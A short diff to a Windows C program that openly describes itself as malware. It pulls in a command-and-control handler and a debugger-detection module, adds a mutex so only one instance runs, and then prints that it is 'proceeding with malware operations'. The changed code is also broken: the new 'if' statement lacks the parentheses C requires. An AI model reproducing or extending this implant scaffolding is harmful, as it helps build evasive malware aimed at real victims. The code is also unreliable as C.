@@ -1,8 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
-#include "debug_check.c"
+
 #include "c2_handler.c"
+#include "debug_check.c"
+#include "mutex.c"
 
 int main(int argc, char* argv[]) {
     (void)argc;  // Unused parameter
@@ -20,6 +22,14 @@ int main(int argc, char* argv[]) {
     }
 
     printf("[+] No multi-method debugger detection.\n");
+
+    // Create mutex to prevent multiple instances
+    if IsOnlyRunningInstance() {
+        printf("[+] No other instance detected. Continuing execution.\n");
+    } else {
+        printf("[!] Another instance is already running. Exiting...\n");
+        exit(1);
+    }
 
     printf("[*] Proceeding with malware operations...\n");
 
